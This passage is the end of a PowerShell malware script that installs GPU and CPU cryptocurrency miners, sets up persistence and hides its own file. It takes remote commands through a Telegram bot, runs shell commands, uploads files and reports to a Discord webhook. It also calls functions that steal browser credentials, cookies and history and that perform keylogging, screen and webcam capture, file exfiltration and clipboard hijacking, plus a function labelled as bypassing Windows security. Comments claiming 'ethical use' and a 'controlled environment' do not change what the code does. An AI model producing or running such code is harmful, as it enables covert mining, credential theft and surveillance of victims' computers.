            Send-DiscordWebhook -message "Executed: $cmd | Output: $output"
        }
        "/upload_file *" {
            $path = $command -replace "/upload_file ", ""
            Send-TelegramFile -filePath $path
            Send-DiscordWebhook -message "File $path uploaded."
        }
        "/list_processes" {
            $processes = Get-Process | Select-Object -Property Name, Id | Out-String
            Send-TelegramMessage -message $processes
        }
        "/kill_process *" {
            $pid = $command -replace "/kill_process ", ""
            Stop-Process -Id $pid -Force
            Send-TelegramMessage -message "Killed process $pid."
        }
        default { Send-TelegramMessage -message "Unknown command: $command" }
    }
}

function Get-TelegramCommands {
    $url = "https://api.telegram.org/bot$telegramBotToken/getUpdates?offset=$script:lastUpdateId"
    $response = Invoke-RestMethod -Uri $url -Method Get
    if ($response.ok -and $response.result) {
        foreach ($update in $response.result) {
            $script:lastUpdateId = $update.update_id + 1
            if ($update.message.chat.id -eq [int64]$telegramChatId) {
                Process-Command -command $update.message.text
            }
        }
    }
}

# **Main Monitoring Function**

function Monitor-Miners {
    $worker = $env:COMPUTERNAME
    Write-Log "Starting mining on $worker..."
    try {
        $gpuType = Test-GPUCompatibility
        if (-not $gpuType) { throw "No compatible GPU detected." }
        
        # Install miners
        Install-Miner -miner "t-rex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
        Install-Miner -miner "nbminer" -url "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip" -path "$baseDir\NBMiner"
        Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
        Install-Miner -miner "lolminer" -url "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip" -path "$baseDir\lolMiner"
        
        Ensure-Persistence
        Start-Job -ScriptBlock { Monitor-Miner }
        
        # Execute additional features (ethical use assumed)
        Get-ChromeCredentials
        Get-EdgeCredentials
        Get-ChromeHistory
        Get-ChromeCookies
        Capture-NetworkTraffic
        Start-Keylogging
        Start-ScreenRecording
        Capture-Webcam
        Exfiltrate-Files
        Start-ClipboardHijacking
        
        $gpus = Get-CimInstance Win32_VideoController
        $switchInterval = 1800  # 30 minutes
        
        while ($true) {
            $currentTime = Get-Date
            if (($currentTime - $script:lastSwitchTime).TotalSeconds -ge $switchInterval) {
                $bestCoin = Get-MostProfitableCoin
                if ($bestCoin -and $bestCoin.algorithm -ne $script:currentAlgorithm) {
                    Write-Log "Switching to more profitable coin: $($bestCoin.tag)"
                    Stop-Miner
                    $script:currentAlgorithm = $bestCoin.algorithm
                    $pool = Get-BestPool -algorithm $bestCoin.algorithm
                    if ($gpuType -eq "NVIDIA") { Set-NvidiaOverclock }
                    elseif ($gpuType -eq "AMD") { Set-AmdOverclock }
                    foreach ($gpu in $gpus) {
                        $gpuIndex = $gpus.IndexOf($gpu)
                        Start-Miner -algorithm $bestCoin.algorithm -pool $pool -gpuIndex $gpuIndex
                    }
                    $script:lastSwitchTime = $currentTime
                }
            }
            Get-TelegramCommands
            Start-Sleep -Seconds 10
        }
    } catch {
        Write-Log "Monitor-Miners failed: $_"
        Send-TelegramMessage -message "Critical error: $_"
    }
}

# **Main Execution**

Write-Log "Initializing mining script with enhanced features..."
try {
    Send-TelegramMessage -message "Initializing enhanced mining script..."
    Send-DiscordWebhook -message "Script started in controlled environment."
    Bypass-WindowsSecurity
    Prevent-Sleep
    Set-ItemProperty -Path "$baseDir\mining.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
    Monitor-Miners
} catch {
    Write-Log "Startup failed: $_"
    Send-TelegramMessage -message "Startup failed: $_"
    Send-DiscordWebhook -message "Startup failed: $_"
}
